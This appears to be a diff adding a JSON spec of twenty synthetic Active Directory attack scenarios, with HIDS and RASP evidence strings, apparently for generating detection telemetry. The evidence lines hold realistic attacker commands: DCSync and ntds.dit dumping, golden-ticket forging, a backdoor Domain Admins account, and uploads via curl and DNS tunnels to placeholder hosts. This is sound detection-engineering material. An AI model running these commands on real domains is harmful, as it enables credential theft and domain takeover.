@@ -1,0 +1,469 @@
+{
+ "form": "FB",
+ "scenarios": [
+  {
+   "idx": 1,
+   "technique": "域控与域管组枚举（net user /domain + nltest /dclist）",
+   "stack": "tomcat",
+   "host_num": 44,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net user /domain; nltest /dclist:corp.local net.exe net user /domain; nltest /dclist:corp.local <== cmd.exe /c net.exe <== svchost.exe"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 2,
+   "technique": "BloodHound 图谱采集（SharpHound All + LDAP 批量查询）",
+   "stack": "java",
+   "host_num": 118,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\\jdoe",
+    "Compress-Archive C:\\Users\\jdoe\\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\\jdoe",
+    "curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\\jdoe"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    240,
+    55
+   ]
+  },
+  {
+   "idx": 3,
+   "technique": "Kerberoasting（setspn 枚举 SPN + Rubeus kerberoast 导出票据）",
+   "stack": "php",
+   "host_num": 71,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "setspn -T corp.local -Q */* setspn.exe setspn -T corp.local -Q */* <== CORP\\jdoe",
+    "Rubeus.exe kerberoast /outfile:krb.txt /domain:corp.local rubeus.exe Rubeus.exe kerberoast <== CORP\\jdoe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    470
+   ]
+  },
+  {
+   "idx": 4,
+   "technique": "AS-REP Roasting（GetNPUsers.py -request 免认证用户票据抓取）",
+   "stack": "rails",
+   "host_num": 26,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "GetNPUsers.py -request -usersfile users.txt -format hashcat -dc-ip 10.20.3.10 corp.local/jdoe python3 GetNPUsers.py <== /bin/bash -c 'python3 GetNPUsers.py' <== python3"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 5,
+   "technique": "域账号密码喷洒（crackmapexec smb 对 10.20.3.0/24）",
+   "stack": "php",
+   "host_num": 37,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v2/auth/login",
+   "carrier": "{\"username\":\"svc_backup\",\"password\":\"Summer2026!\"}&domain=corp.local",
+   "rasp_evidence": "{\"auth_spray\": \"svc_backup\"}",
+   "hids": [
+    "crackmapexec smb 10.20.3.0/24 -u users.txt -p 'Summer2026!' -d corp.local --continue-on-success cme cme crackmapexec smb <== /bin/bash -c 'cme smb' <== python3"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    96
+   ]
+  },
+  {
+   "idx": 6,
+   "technique": "PrivExchange 推送订阅 + ntlmrelayx 中继 LDAP → secretsdump DCSync",
+   "stack": "iis",
+   "host_num": 51,
+   "shape": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/EWS/Exchange.asmx",
+   "carrier": "",
+   "rasp_evidence": "{\"ntlm_relay\": \"ldap://10.20.3.10\", \"push_sub\": true}",
+   "hids": [
+    "ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c",
+    "secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    118,
+    240
+   ]
+  },
+  {
+   "idx": 7,
+   "technique": "DCSync 拉取 krbtgt 哈希（lsadump::dcsync）并 DNS 隧道外传",
+   "stack": "java",
+   "host_num": 163,
+   "shape": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\\temp\\d.csv tk.exe <== CORP\\admin <== services.exe",
+    "powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\\admin"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    210,
+    0,
+    60,
+    75
+   ],
+   "dns_base": "qpvzmt-7c41.net",
+   "dns_gap_h": 2.4,
+   "dns_steps": [
+    60,
+    75
+   ]
+  },
+  {
+   "idx": 8,
+   "technique": "ntds.dit 影子副本复制外带（ntdsutil ifm → DNS 隧道）",
+   "stack": "nginx",
+   "host_num": 47,
+   "shape": [
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\ifm\" q q ntdsutil.exe ntdsutil <== CORP\\admin <== services.exe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    0,
+    40,
+    95
+   ],
+   "dns_base": "nxbsru-91ad.net",
+   "dns_gap_h": 4.8,
+   "dns_steps": [
+    40,
+    95
+   ]
+  },
+  {
+   "idx": 9,
+   "technique": "黄金票据伪造（kerberos::golden /krbtgt: → ptt → 访问 DC C$）",
+   "stack": "node",
+   "host_num": 58,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-3104-512 /krbtgt:4f8a1c9d2b7e6351a0c4de88f3b9a712 /ptt tk.exe <== cmd.exe /c tk.exe <== services.exe",
+    "kerberos::ptt C:\\temp\\adm.kirbi tk.exe kerberos::ptt C:\\temp\\adm.kirbi <== cmd.exe /c tk.exe <== services.exe",
+    "dir \\\\dc01.corp.local\\C$ cmd.exe cmd.exe /c dir \\\\dc01.corp.local\\C$ <== cmd.exe /c dir <== svchost.exe"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    25,
+    140
+   ]
+  },
+  {
+   "idx": 10,
+   "technique": "白银票据伪造（kerberos::golden /service:cifs 直连文件服务器）",
+   "stack": "django",
+   "host_num": 133,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "kerberos::golden /service:cifs /target:fs01.corp.local /rc4:b7e2d1f4a9c8036e5d2b71c4e8f0a3d6 /ptt tk.exe <== CORP\\jdoe"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 11,
+   "technique": "域控 SMB 横向（smbclient.py 探测 + psexec.py 落 DC）",
+   "stack": "go",
+   "host_num": 76,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "smbclient.py CORP/svc_backup@10.20.3.10 -hashes :8846f7ea2b3c1d5e6f7a8c9d0e1f2a3b python3 smbclient.py <== /bin/bash -c",
+    "psexec.py CORP/administrator@dc01.corp.local cmd.exe python3 psexec.py <== /bin/bash -c",
+    "cmd.exe /c net share; net use \\\\dc01.corp.local\\ADMIN$ cmd.exe cmd.exe /c net share <== CORP\\administrator"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    180,
+    65
+   ]
+  },
+  {
+   "idx": 12,
+   "technique": "组策略滥用（SharpGPOAbuse 计算机任务 + GPP 注册表开机项）",
+   "stack": "spring",
+   "host_num": 21,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "SharpGPOAbuse.exe --AddComputerTask --TaskName Corp_Logon --Author CORP\\gpo_admin --Command cmd.exe --Arguments \"/c powershell -enc SQBFAFgA\" <== cmd.exe /c SharpGPOAbuse.exe <== services.exe",
+    "Set-GPPrefRegistryValue -Name Corp_Logon -Context Domain -Key \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -ValueName Updater -Value C:\\Windows\\Temp\\u.exe -Type String -Action Update <== powershell.exe -NoP <== svchost.exe"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    520
+   ]
+  },
+  {
+   "idx": 13,
+   "technique": "域账号后门（net user /add /domain + 加入 Domain Admins）",
+   "stack": "php",
+   "host_num": 149,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net user svc_sqladd Xr7#pqZ2! /add /domain net.exe net user svc_sqladd /add /domain <== CORP\\admin",
+    "net group \"Domain Admins\" svc_sqladd /add /domain net.exe net group \"Domain Admins\" svc_sqladd <== CORP\\admin",
+    "runas /netonly /user:corp.local\\svc_sqladd cmd.exe runas.exe runas /netonly /user:corp.local <== CORP\\admin"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    45,
+    300
+   ]
+  },
+  {
+   "idx": 14,
+   "technique": "约束委派滥用（Rubeus s4u S4U2Self/S4U2Proxy 冒充域管）",
+   "stack": "java",
+   "host_num": 87,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "Rubeus.exe s4u /user:svc_web /rc4:9c1d44b8e2f7a1c6d3b90e5f4a2c7d81 /impersonateuser:Administrator /msdsspn:cifs/fs01.corp.local /altservice:ldap <== CORP\\jdoe",
+    "Enter-PSSession -ComputerName dc01.corp.local -Authentication Negotiate <== CORP\\Admin"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0,
+    390
+   ]
+  },
+  {
+   "idx": 15,
+   "technique": "ADCS 证书模板滥用 ESC1（certsrv 申请 + certipy req 冒充域管）",
+   "stack": "iis",
+   "host_num": 64,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/certsrv/certfnsh.asp",
+   "carrier": "",
+   "rasp_evidence": "{\"adcs_esc1\": \"template=User\"}",
+   "hids": [
+    "certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    74
+   ]
+  },
+  {
+   "idx": 16,
+   "technique": "影凭据攻击（Whisker 写 msDS-KeyCredentialLink + certipy auth）",
+   "stack": "tomcat",
+   "host_num": 172,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\\jdoe",
+    "certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    145
+   ]
+  },
+  {
+   "idx": 17,
+   "technique": "域信任枚举与跨域横向（nltest /domain_trusts → 子域 DC ADMIN$）",
+   "stack": "node",
+   "host_num": 29,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "nltest /domain_trusts /all_trusts /v nltest.exe nltest /domain_trusts /all_trusts <== CORP\\jdoe",
+    "net use \\\\dc02.eu.corp.local\\ADMIN$ /user:EU\\admin net.exe net use \\\\dc02.eu.corp.local\\ADMIN$ <== CORP\\admin"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    430
+   ]
+  },
+  {
+   "idx": 18,
+   "technique": "组策略首选项密码读取（SYSVOL Groups.xml cpassword 解密）",
+   "stack": "php",
+   "host_num": 106,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "findstr /S /I cpassword \\\\dc01.corp.local\\SYSVOL\\corp.local\\Policies\\*.xml cmd.exe <== CORP\\jdoe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 19,
+   "technique": "会话枚举与令牌窃取（quser + Invoke-TokenManipulation 窃取域管会话）",
+   "stack": "go",
+   "host_num": 137,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "quser /server:dc01.corp.local quser.exe quser /server:dc01.corp.local <== CORP\\jdoe",
+    "Invoke-TokenManipulation -ImpersonateUser -Username CORP\\adm_domain <== CORP\\jdoe"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    260
+   ]
+  },
+  {
+   "idx": 20,
+   "technique": "域控持久化（DSRM 口令重置 + DsrmAdminLogonBehavior + AdminSDHolder）",
+   "stack": "java",
+   "host_num": 39,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "ntdsutil \"set dsrm password\" \"reset password on server null\" q q ntdsutil.exe ntdsutil <== CORP\\admin",
+    "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\\admin",
+    "dsacls \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" /G CORP\\svc_scan:GA dsacls.exe <== CORP\\admin"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    85,
+    190
+   ]
+  }
+ ]
+}
